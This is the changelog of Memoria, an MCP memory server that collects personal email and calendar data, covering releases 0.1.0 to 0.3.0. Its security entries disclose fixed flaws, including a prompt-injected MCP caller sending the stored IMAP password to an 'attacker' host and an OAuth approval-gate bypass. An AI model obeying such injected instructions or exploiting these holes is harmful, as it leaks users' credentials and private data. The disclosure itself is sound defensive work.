# Changelog

All notable changes to Memoria are recorded here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and versions follow
[Semantic Versioning](https://semver.org/spec/v2.0.0.html).

Memoria is pre-1.0: the memory **file format** is stable and treated as such
(your Markdown will keep working), but env-var names, HTTP endpoints and tool
signatures may still change in a minor release. Anything that would break an
existing store gets a migration note here.

## [Unreleased]

## [0.3.0] — 2026-10-28

Security fixes from the 2026-10 whole-repo review and the critical
re-review that followed it, plus a re-weighted search default. The memory
file format is unchanged. **The search index is rebuilt once on first
start** (see below); access counts and last reads are kept.

**Breaking changes:**

- **Collector consent can no longer be granted through MCP.** The
  `memory_sources` `agree` action is removed; grant consent in the
  dashboard (Sources tab) instead. An MCP caller — including a
  prompt-injected one — can no longer consent on your behalf.
- **An OpenAI key no longer selects remote embeddings by itself.** Only
  `MEMORIA_EMBEDDINGS=openai` sends memory content and search queries to
  OpenAI; `auto` now stays local. Set it explicitly if you rely on OpenAI
  embeddings.
- **docker-compose now requires `MEMORIA_PUBLIC_URL`** in `.env` (the
  `.env.example` localhost value covers purely local use), so a remote
  deploy cannot silently pin OAuth discovery to a loopback issuer.
- **Search ranks by relevance first.** The default weights moved from
  `0.2·recency + 0.3·importance + 0.5·relevance` to
  `0.8·relevance + 0.1·recency + 0.1·importance`. Relevance scores sit in a
  narrow band while the priors span 0-1, so the old weights let recency
  and importance decide most rankings; the retrieval eval measured the old
  default at 33.1 nDCG@10 against 60.4 for the new one (hash provider;
  see `mcp-server/eval/README.md`).
- **MCP callers can only change a source's scheduling.** `memory_sources`
  `enable`/`configure` accept `pollIntervalSec` and `importanceThreshold`;
  hosts, credentials, paths and labels change only in the dashboard.
- **`client_credentials` is refused while
  `MEMORIA_AUTHORIZE_REQUIRE_APPROVAL=true`**, and a dashboard login no
  longer approves by itself: `/authorize` shows a consent page and issues
  the code when you click Approve.
- **Dashboard consent and source-settings routes refuse OAuth tokens**
  issued to MCP clients; use a dashboard login or the API key.
- **Disabling a source in the dashboard withdraws its consent**; enabling
  it again asks again.
- **The store lock keeps a heartbeat.** A lock held by a live server on
  another host is waited on, then refused; deployments that overlap
  instances on one store by design (Cloud Run rollouts) set
  `MEMORIA_LOCK_TAKEOVER=true`, as `deploy/gcp/cloudbuild.yaml` now does.

### Security

- The `/authorize` approval gate could be bypassed: `client_credentials`
  minted a token from the client secret alone. It is now disabled (and no
  longer advertised) while the gate is on. The gate's `memoria_approve`
  cookie is `SameSite=Lax`, because browsers withhold `Strict` cookies on
  the cross-site navigation from claude.ai, so the gate could never be
  passed in a real browser. Because a Lax cookie is sent on any cross-site
  navigation, it only unlocks a same-origin consent page whose
  CSRF-bound POST issues the code (otherwise any page could trigger a
  code for an attacker's pending flow). Each session cookie is honoured
  only on its own path, and malformed or oversized PKCE challenges are
  rejected before anything is stored.
- A prompt-injected MCP caller could reuse a source's consent with its
  own settings: `enable email {host: "attacker", secure: false}` sent the
  stored IMAP password to the attacker in plaintext. Settings changes now
  require the dashboard. Removing a custom source revokes its consent, so
  a re-added source with the same id (another path or command) needs
  consent again. An OAuth token could also call the dashboard's consent
  and configure routes; those now need a dashboard login or the API key.
- `pollIntervalSec` had no maximum: values past 2^31-1 ms made
  setInterval fire every 1ms (back-to-back IMAP logins and API calls).
  It is capped at one day.
- Ingestion's dedup search embedded the first 200 raw characters of every
  event before privacy enforcement, so with `MEMORIA_EMBEDDINGS=openai`
  local-only content (calendar notes, account numbers) reached OpenAI even
  though the daily log redacted it. Privacy is enforced first; local-only
  events skip the similarity search.
- Fingerprints that are written down (the ingest dedup sidecar,
  provenance records, content-derived custom-source ids that reach the
  synced daily log) are now HMACs under a key derived from the collector
  master key; a bare SHA-256 of short local-only content was reversible
  by guessing.
- Dependencies: `npm audit` is clean (was 11 advisories, 1 critical and
  6 high, including `proxy-addr`, `@modelcontextprotocol/sdk`,
  `markdown-it`, `body-parser`, `zod` and `sharp`). Direct dependency
  floors are raised to the fixed versions.

### Fixed

- Bounded `memory_reflect`/`memory_compact` `days` and `max_chars`,
  `memory_ingest` `batch_size`, `memory_search` query length, and
  `memory_compile` tags/related; the compile size cap now measures bytes.
- One collector per store: the first server to open a store holds its
  lock (stale locks reclaimed) and runs the collector and scheduled
  maintenance; further servers on the same store (another Claude Code
  window, Claude Desktop) run as secondaries that share the memories and
  take over the lock when the primary exits. SQLite waits on
  `busy_timeout`, and the compile queue drains by atomic rename so an
  enqueue during a drain is no longer deleted unread. The stdio server
  exits when its client closes stdin; an orphaned server used to live on
  (the file watcher kept it running) and hold the store.
- The provenance archive stores non-`local-only` content encrypted under
  the collector master key instead of plaintext (older plaintext records
  still read back).
- `scripts/sync/memoria-sync-pull.sh` no longer executes
  `$STORE/.memoria-mirror.sh` unless `MEMORIA_SYNC_ALLOW_STORE_MIRROR=true`.
  The push hook applied no such gate and executed the store-resident
  mirror on any publish-eligible Stop-hook run; it now uses the same
  opt-in as pull.
- `scripts/sync-from-claude-memory.sh` only overwrites a destination when
  the source is newer, backs up whatever it replaces, and supports
  `--dry-run`. First behavioural tests for both scripts live in
  `scripts/tests/`.
- On-demand adapter installs are pinned to exact versions
  (`imapflow@2.4.0`, `googleapis@185.0.0`); unpinned names are refused.
- `/ingest` event `meta` is sanitized (control characters stripped,
  nested values dropped) so it cannot forge daily-log headings.
- Optional `/authorize` approval gate:
  `MEMORIA_AUTHORIZE_REQUIRE_APPROVAL=true` requires a dashboard session
  or the API key before a code is issued (and disables
  `client_credentials`, see Security).
- Recency was the time a chunk was indexed, so every edit, provider
  switch or rebuild made every memory look new and restarted the decay
  and staleness clocks. It now comes from frontmatter `updated` (else
  `created`, else mtime) on a first index and from mtime when an indexed
  file is edited, and re-embedding keeps a file's access history; an edit
  counts as a touch for staleness and decay. Indexes built by earlier
  versions are re-embedded once on start, keeping access counts and last
  reads (a provider change keeps them too, where it used to drop them).
  Only ISO dates are read from frontmatter.
- A file whose body was emptied (frontmatter only) kept its old chunks, so
  text deleted to redact it stayed searchable. Its chunks are now dropped.
- A crash left a store lock naming the dead server's pid; in a restarted
  container node usually gets the same pid, so the lock named the new
  server itself and the store refused to open on every restart. Locks now
  record the host and the holder's start time, carry a heartbeat (used
  only for locks from another host), and are tracked per process by real
  path, so a leftover or a reused pid is reclaimed while a live holder,
  even one paused or asleep, never is; a server shutting down no longer
  deletes a successor's lock, one that lost its lock says so, and a
  reclaim race that could let two servers in is closed. Index state for
  files deleted while the server was down is dropped at startup.
- Collector sources marked enabled were never restarted after a server
  restart (the dashboard still said "Enabled"), and the collector only
  started when a collector tool, the dashboard or `/ingest` touched it.
  Both servers now resume enabled sources at startup, in the background
  and per source, retrying ones that fail every 10 minutes; lifecycle
  operations on a source are serialized, so a resume racing a dashboard
  enable no longer leaks a connection.
- Adapter cursors only advance past what was collected, and are saved
  after every successful poll instead of only on a clean shutdown; a
  failed poll or buffer write restores the cursor. Shutdown, disable and
  re-enable no longer save a live cursor a poll may have run ahead with.
  - IMAP passed `uid: true` in the fetch query rather than its options,
    so the UID cursor was matched against sequence numbers (polls returned
    nothing, or only the newest message). It also never reconnected after
    a dropped connection and swallowed every error. The cursor now records
    UIDVALIDITY and restarts when the mailbox changes identity.
  - Gmail jumped its cursor to the mailbox's current history id after the
    first page and sliced off messages beyond `maxResults`, so a burst of
    mail lost everything past the first batch; a failed message fetch was
    dropped after the cursor moved.
  - macOS Calendar never returned its first-poll window (init set the
    cursor to "now"), lost every row past the 200th in a poll, and
    reported query errors as an empty calendar. A full page tied on one
    (sub-millisecond) modification time now moves on instead of repeating.
- The dashboard's first-time setup for email and Google sources posted
  their settings to `/enable` flat, where they landed beside `settings`
  instead of in it, so those sources failed to start; and
  `memory_priority` `set_threshold` wrote a field no adapter reads.
- Re-enabling a running source re-initialised it without releasing the
  old instance's connection or database handle.
- `memory_lint`'s knowledge-gap check compared the blended search score to
  a cut tied to the old ranking weights; it now gates on relevance.
- Keyword search required every query word to appear in a chunk (FTS5's
  implicit AND), so natural-language queries rarely matched; words are
  now ORed, with BM25 ranking chunks that match more and rarer words
  first (eval, hash provider: default 60.4 -> 61.7 nDCG@10, keyword only
  53.8 -> 66.5).
- One file that failed to index (an embedding API error, an over-limit
  chunk) exited the server at startup and stopped the periodic sweep;
  failures are now logged and skipped per file. Single lines longer than
  a chunk are split. `memory_index` takes `force: true` to re-embed every
  file. The lexical (hash) embedding keeps non-ASCII words.
- HTTP: an unknown or expired MCP session gets 404 (the spec's signal to
  re-initialize) instead of 400; request bodies on /mcp, /dashboard/api
  and /ingest are parsed only after authentication (64KB elsewhere); at
  the session cap the idlest session is closed instead of answering 503.
  New `MEMORIA_TRUST_PROXY` (default 1) sets the proxy hop count.
- The macOS Calendar adapter now tracks events by fingerprint over its
  window, so events with no modification date and events that slide into
  the look-ahead window are collected. IMAP fetches one batch per poll
  instead of re-downloading the whole backlog.
- Custom file watchers and shell commands emit only records they have
  not read before (the checkpoint keeps the last read's record ids);
  they re-emitted the whole file or output on every change.
- Buffer: retention compared mismatched date formats and deleted rows up
  to a day early; rows that cannot be decrypted (a changed master key)
  blocked the ingest queue and are now held aside, kept, and released if
  they decrypt again.
- Fused activities are written once: the daemon fuses only events it
  wrote, and an activity whose events were all fused already is skipped.
- Entity pages for sources whose names slugify alike no longer overwrite
  each other.
- The sync push hook schedules a deferred push for the end of its rate
  limit instead of leaving a session's last commits on the device; the
  push runs in its own session, so the hook runner cannot kill it.
- `deploy/gcp/deploy-demo.sh` could not start (production posture
  checks) and ran two instances; fixed.
- The Python ingestion hook no longer blocks `record_*` calls on the
  network, sends at most 200 events per request (the `/ingest` limit),
  and drops batches the server rejects with a 4xx instead of retrying
  them forever.
- The dashboard's consent dialog for a custom source shows the file it
  reads or the command it runs, not only its (caller-chosen) name.
- A failed build no longer overwrites `dist/` (`noEmitOnError`), so the
  launcher really serves the previous build; the plugin's first install
  uses `npm ci`.
- Promotion (`boostImportance`) stops two points above a memory's own
  importance; with every search result counting as an access, files
  drifted to 10.
- `docker-compose.yml` exposes `MEMORIA_TRUST_PROXY`.
- Dashboard annotations use the atomic append helper; entity-page
  regeneration re-checks for human edits at write time; the custom
  file-watcher skips files over 10 MB instead of reading them whole.
- The collector daemon's first poll on (re)start never ran: the poll timer
  was registered only after the immediate poll fired, and the poll looks
  its timer up in the registry, so collection silently waited a full
  interval. Registration now happens first. The daemon also gained its
  first dedicated test suite, and its coverage floor rose accordingly.
- Overlapping ingestion could write an event twice: the daemon's
  ingestion timer had no in-flight guard, so a cycle slower than the
  interval re-fetched the same unsynced batch, and the shared ingestion
  pipeline checked the dedup hash before recording it, so concurrent
  `ingest()` calls (daemon, `memory_ingest`, `/ingest`) could both pass
  and both write. Cycles now join the in-flight cycle instead of
  starting a second one (`stop()` awaits it, then flushes once more),
  and pipeline calls are serialized in arrival order.
- Cross-source temporal fusion (daemon and `memory_fuse`) wrote raw event
  content to the synced daily log without the sink-side privacy enforcement
  ingestion applies, so a `local-only` event clustered with any second
  source leaked verbatim. Fusion now enforces the same privacy tiers
  (shared `enforceEventPrivacy` in `adapters/base.ts`) and drops
  `local-only` events before clustering; the meta screen also classifies
  non-scalar values (arrays/objects) so a shaped `meta.subject` cannot
  smuggle a secret into a fused label.

## [0.2.1] — 2026-09-24

Fixes from a full review of 0.2.0, and from the independent re-reviews of
those fixes. The memory file format is unchanged.

**Upgrading from 0.2.0:**
- OAuth clients, claude.ai among them, sign in once more, because stored
  tokens are now hashed. The static API key is unaffected.
- The Docker image is now built on Debian (`node:26-slim`) instead of Alpine.
  If you derive your own image from it, switch `apk` to `apt-get`.
- If you ever enabled an email or Google source, and `package.json`,
  `package-lock.json` or `node_modules` appeared in your Memoria directory,
  delete them. The server warns about them at startup.

### Fixed

- **`memoria-mcp-http` did nothing when installed globally on Linux or
  macOS.** `npm install -g` links the command to the server file through a
  symlink, and the check for "am I being run directly?" compared the symlinked
  path against the real one. They never matched, so the process loaded, never
  started the server, and exited with status 0 and no error. Windows and Docker
  were unaffected, which is why it went unnoticed.
- **The HTTP server now shuts down cleanly on `SIGTERM`**, which is what
  `docker stop`, Cloud Run and systemd send. Only `SIGINT` (Ctrl-C) was
  handled, so every stop in production was a hard kill that skipped closing
  the databases and flushing the collector. The stdio server handles `SIGTERM`
  too, and a stop that arrives during the first index at startup now exits
  cleanly instead of with an error.
- **Malformed requests got a 500 instead of an error response.** A `/token`
  request with no body, a credential containing non-ASCII characters, a JSON
  field of the wrong type, or a repeated query parameter on `/authorize` could
  all throw. Each now gets the proper 4xx response. A final error handler
  also makes sure an unexpected error never sends a stack trace, whatever
  `NODE_ENV` is set to (only the Docker image set it to `production`).
- The dashboard journal accepts only the moods its picker offers, and tags as
  a list of up to 20 single-line strings of at most 50 characters. A newline in
  either could forge a heading in the daily log, and a `tags` value that was
  not a list caused an error. `memory_daily` entries are capped at 50,000
  characters, the same limit the journal already had.
- **A crash could leave a file truncated.** Memory files (`memory_write`,
  `memory_compile`), `MEMORY_INDEX.md`, entity pages, the compile queue, the
  ingestion dedup state and the collector's encrypted credential store were
  overwritten in place. A crash, a full disk or a reader arriving mid-write
  found a truncated file. For the credential store that meant every stored
  credential was lost. They are now written to a temporary file beside the
  target and renamed over it, so the old content or the new is always intact.
- **Daily logs could lose an entry.** When two writers found today's log
  missing at the same moment (say, the collector and `memory_daily`), the
  second one's create overwrote the first one's entry. Creation is now
  exclusive and the second writer appends. Raising a daily log's importance no
  longer rewrites the whole file from a copy read a moment earlier, which could
  drop an entry appended in between. It now overwrites just the digits in
  place, after checking they are still there, whenever the value keeps its
  width. Only a bump to 10 rewrites the file, atomically, and only if the
  file has not grown since it was read. It no longer re-encodes a log that contains
  text that is not valid UTF-8, and it leaves alone an `importance:` line in
  the body of a log whose frontmatter has none. Cross-source fusion no longer
  creates a daily log without frontmatter when it is the first writer of the
  day.
- `/ingest` accepts an event whose `timestamp` cannot be parsed, or lies
  outside the years 1970–9999 (epoch microseconds sent as milliseconds, say),
  and records it at the time it arrived. Before, such an event failed on every attempt
  and was eventually dropped, while the response still counted it as
  accepted. The response now also includes `failed`, the number of events
  that could not be written this time (they stay buffered for retry).
- **Keyword search ignored any word with a non-ASCII letter.** The query
  sanitiser kept only ASCII word characters, so `Müller` became `M ller`,
  `café` became `caf`, and Chinese or Japanese text vanished: the keyword half
  of search matched nothing, and only the vector half could find those
  memories. The words `AND`, `OR`, `NOT` and `NEAR` passed through as search
  operators instead, so a query containing one of them either changed meaning
  or was a syntax error that search swallowed without a word. Every query word
  is now passed as a quoted term. Accents are optional (`cafe` finds `café`).
  Chinese and Japanese words match when the text separates them with spaces,
  as the full-text index does not segment unspaced CJK text. On the retrieval
  eval's English gold set the scores are unchanged, as they should be.
- **The email and Google sources could not be enabled.** Enabling one
  installs its optional dependency (`imapflow` or `googleapis`). That install
  ran inside the Memoria directory (`MEMORIA_DIR`), adding a `package.json`
  and `node_modules` next to your memories, where the adapters could not load
  them. The "is it installed?" check always said no, and on Windows the install
  itself failed. Dependencies now install into `<data dir>/adapter-modules`
  with install scripts disabled, and both the check and the adapters look
  there, and only there: a `node_modules` in a folder above it, such as one
  an earlier install left in the Memoria directory, is not used to find them.
  Their own dependencies still resolve the usual way, so the server now warns
  at startup if such a folder exists, and the store template's `.gitignore`
  excludes `node_modules/`, `package.json` and `package-lock.json`. npm runs
  as its own script under the server's Node binary, with no shell and no
  command lookup, so no file in that directory can stand in for npm. The install also no longer freezes the server while it runs. If an
  earlier attempt left `package.json`, `package-lock.json` or `node_modules`
  in your Memoria directory, you can delete them.
- **The Docker image could not run its default embedding model.** The image
  was built on Alpine Linux, but the runtime behind the local MiniLM model
  ships only for glibc-based Linux, so it could not load there. With the
  default settings (or the reference Cloud Run template, which asks for MiniLM
  explicitly) every embedding failed, and a container started on a store that
  already held memories exited during its first index. The image is now built
  on Debian (`node:26-slim`), and CI checks that the model loads, offline, in
  the image it ships. This had gone unnoticed because the build-time model
  download swallowed the same error (see Security below) and the CI smoke test
  used the lexical fallback.
- Symlinked `.md` files under `memories/` are no longer indexed. The memory
  tools already refused to read or write through a symlink, but indexing
  followed one, so a link pointing outside the store put that file's content
  into search results.
- `scripts/sync-from-claude-memory.sh` imported into the directory the script
  was checked out in, rather than your store, and picked whichever Claude Code
  project had "memoria" in its name. It now uses `MEMORIA_DIR` (default
  `~/.memoria`, like the server) and takes the auto-memory directory as an
  argument, choosing automatically only when there is exactly one.

### Changed

- **Entry times in daily logs are now UTC**, written as `14:05 UTC`. Each
  entry goes into the log for the UTC date on which it is written, but times
  were labelled in the server's local time zone, so on a server west of UTC an
  evening entry showed an evening time inside the next day's log. (A
  collected event keeps its own time in the label, so one that arrives after
  midnight UTC shows its earlier time in the new day's log.) Entries already in your
  logs are unchanged, and the entity compiler, `memory_compact` and
  `memory_stats` read both forms.

### Removed

- `scripts/lib-union-merge.sh`. The docs described it as the way to merge
  daily logs without git, but it needed git itself plus a hook that never
  shipped. The multi-device guide now says plainly that only a git-synced store
  merges two devices' entries in the same daily log.

### Security

- **Dashboard: values from memory files could break out of an HTML
  attribute.** The page's escaping function left quotes unescaped, and file
  names and `related` links from frontmatter went into `data-file="..."`
  attributes. It now escapes all five HTML-significant characters. The page also
  sends a Content-Security-Policy that runs only its own nonce-tagged script,
  and its 21 inline `onclick`-style handlers were replaced by event listeners,
  so markup that slipped past escaping still could not run script. The page
  also refuses to load inside a frame.
- **OAuth access tokens and authorization codes are stored hashed** (SHA-256)
  in `tokens.sqlite`, and the logs show a prefix of the hash rather than of the
  token. A copied token database no longer contains a usable credential.
  *Upgrade note:* tokens issued before the upgrade stop working, so connected
  OAuth clients (such as claude.ai) sign in again once. Tokens lived for 24
  hours anyway. Clients using the static API key are unaffected.
- `tokens.sqlite` is created readable by its owner only (`0600`). Before, it
  was created with the default permissions and there was a window before they
  were tightened.
- The auto-generated encryption key file, `collector.key`, is likewise created
  owner-only from the first byte on Linux and macOS (on Windows it inherits
  the data folder's permissions), and never over an existing key. Two
  processes starting together could each write a key of their own, leaving
  whatever the first had encrypted unreadable. A corrupt or truncated key file
  is now reported by name when the collector starts, not as a confusing
  "Invalid key length" at the first decryption.
- **Docker image:** the runtime image no longer ships the development
  toolchain (TypeScript, Vitest, ESLint and their dependencies). The service
  user no longer owns the application code, so a compromised process cannot
  rewrite it; it owns only `/data` and the model cache. The embedding model
  download at build time no longer fails silently. A failure now fails the
  build, where before the image quietly fetched the model on first use (skip
  the download with `--build-arg PREFETCH_MODEL=false`). CI checks all three
  on the built image.
- OAuth redirects to `localhost` / `127.0.0.1` must use `http` or `https`.
  Other schemes with a local host were accepted.
- Documented `MEMORIA_TOKEN_DB_DIR`, `MEMORIA_OAUTH_CLIENT_ID` and
  `MEMORIA_FILE_WATCHER_ROOTS`, which were read but missing from the
  configuration table. The code comment on the token database now matches what
  the code does: it defaults to the data directory.

## [0.2.0] — 2026-09-23

First release published to npm, as **`@agrippa87/memoria-mcp`**. The name
planned for 0.1.0, `@memoria/mcp`, turned out to be unavailable — the
`@memoria` npm organisation belongs to an unrelated project — so it was never
published. Do not install anything under `@memoria/*` expecting this project.

### Changed

- **Gentler default guidance to connected clients.** The server description and
  the `memory_daily` tool previously told every client that each session MUST
  write a daily log entry and that a session without one "is a failed session".
  That was the maintainer's own workflow, stated as a rule for everyone. Both
  now encourage logging what is worth keeping, and say routine sessions need no
  entry. If you want the stricter discipline, put it in your own instructions
  (a `CLAUDE.md`, a hook). The description is now defined once and shared by the
  stdio and HTTP servers, so the two cannot drift apart.
- **Requires Node 20 or newer.** `package.json` previously claimed Node 18, but
  `better-sqlite3` supports nothing older than 20, so an install on Node 18
  could not have worked. The declared range now tells the truth.
- Upgraded `js-yaml` 4 → 5, the library that reads and writes every memory
  file's frontmatter. **The file format is unchanged**: across 190 real
  frontmatter blocks, v5 parses to identical values and writes byte-identical
  YAML. Two things needed care. v5 has no default export, and under this
  project's TypeScript settings the old `import yaml from "js-yaml"` still
  compiled — then failed at link time in Node, which would have stopped the
  server starting. And v5's core schema stopped quoting `yes`, `no`, `on` and
  `off` on write; Memoria reads those correctly either way, but YAML 1.1 readers
  such as PyYAML would see booleans, so the write schema restores the quotes.
  A new round-trip test pins that every string written comes back identical.

### Security

- Replaced the unmaintained `@xenova/transformers` with its maintained
  successor `@huggingface/transformers` v3, and pinned `sharp` to a patched
  release. This clears all five open advisories — four high and one critical —
  which all descended from that one optional dependency's `onnx-proto` /
  `protobufjs` chain. `npm audit` now reports zero vulnerabilities.

### Fixed

- Pinned the local embedding model to its int8 weights (`dtype: "q8"`).
  transformers.js v3 changed the default to fp32 under the same model id, which
  would have shifted the vector space by cosine 0.993 — close enough to look
  correct, and invisible to the provider-change check, which keys on provider
  name and dimension. Existing stores would have silently mixed two vector
  spaces. Vectors are now byte-identical to every previously written index, and
  `npm run verify:vectors` guards that going forward.

### Added

- `scripts/verify-vector-space.mjs` and a committed reference-vector fixture:
  a regression guard asserting the local embedding provider still produces the
  same vectors. Run it whenever the embedding dependency, model id or dtype
  changes.
- CI now builds the Docker image and smoke-tests it against `/health`. Nothing
  previously exercised the Dockerfile, so a base-image or native-module break
  could reach `main` unverified.

## [0.1.0] — 2026-08-25

First public release. The server had been running as the maintainer's daily
driver since spring 2026; this release is the extraction of that work into a
clean, public repository. Development history before this point lives in a
private repo that cannot be published — it is a memory store, not just code —
so the public history starts here.

### Added

- **MCP server** with two transports: stdio for Claude Code, and Streamable
  HTTP/SSE with full OAuth 2.1 (authorization code + mandatory PKCE S256,
  client credentials, RFC 7591 dynamic registration, RFC 8414/9728 discovery)
  for claude.ai and other remote clients.
- **17 MCP tools** — search, read, write with write-time dedup, list, index
  rebuild, daily logs, optimize, reflect, stats, lint, compile, compact, entity
  compilation, and four collector controls.
- **Hybrid retrieval**: `0.2 × recency + 0.3 × importance + 0.5 × relevance`,
  where relevance is `0.7 × vector cosine + 0.3 × FTS5 BM25`. Three embedding
  providers auto-selected: OpenAI `text-embedding-3-small` → local
  `all-MiniLM-L6-v2` (offline) → n-gram hashing. Scan coverage is always
  reported, so partial scans are never silent.
- **Sub-memory collector** (experimental) with adapters for iMessage, macOS
  Calendar, IMAP, Gmail, Google Calendar, Google Drive and user-defined custom
  sources; consent gating, privacy tiers, AES-256-GCM encryption at rest, a
  ring buffer with backpressure, and no-silent-loss ingestion guarantees.
- **Web dashboard** with a cross-linked wiki view, journal, memory browser and
  source management, behind an httpOnly session cookie.
- **Claude Code plugin** — `/plugin marketplace add Agripp87/memoria_mcp` then
  `/plugin install memoria@memoria` registers the MCP server and the sync
  hooks. First launch bootstraps its own dependencies.
- **Multi-device sync** (`scripts/sync/`): fail-soft pull/push hooks for any
  git remote, with an optional object-storage mirror hook. Same-day daily-log
  conflicts resolve themselves via git's built-in `union` merge driver, enabled
  by the `.gitattributes` in `store-template/`.
- **Deployment**: multi-stage Docker image (non-root, pre-baked embedding
  model), `docker-compose.yml`, and a reference Cloud Run + GCS FUSE template
  under `deploy/gcp/` with CI/CD and auto-rollback.
- **Python `/ingest` client** (`integrations/orchestrator_hook.py`) for pushing
  events from external agent systems.
- 248 tests with per-file coverage floors, running on Ubuntu and Windows;
  ESLint, Prettier, shellcheck and a full-history gitleaks scan in CI.

### Security

- Documented the trust model honestly in [SECURITY.md](SECURITY.md): Memoria is
  single-tenant, `/authorize` auto-approves (the client secret is what actually
  gates access), and in every shipped network deployment a single static bearer
  key is the only access control. Read it before exposing an instance.
- The collector is shipped but labelled **experimental** — it is the most
  personal-data-sensitive and least adversarially tested surface.

### Notes

- Package names: `memoria-mcp` reserved on PyPI. The npm name planned here,
  `@memoria/mcp`, was never published — that scope belongs to an unrelated
  project. See 0.2.0 for the real one.
- Known limitations — single static key, partial coverage of the tool handlers
  and dashboard JS, no staging environment, and a single-writer scaling ceiling
  from the SQLite index living on a FUSE mount — are listed in the
  [README](README.md#known-limitations) rather than glossed over.

[Unreleased]: https://github.com/Agripp87/memoria_mcp/compare/v0.3.0...HEAD
[0.3.0]: https://github.com/Agripp87/memoria_mcp/compare/v0.2.1...v0.3.0
[0.2.1]: https://github.com/Agripp87/memoria_mcp/compare/v0.2.0...v0.2.1
[0.2.0]: https://github.com/Agripp87/memoria_mcp/compare/v0.1.0...v0.2.0
[0.1.0]: https://github.com/Agripp87/memoria_mcp/releases/tag/v0.1.0
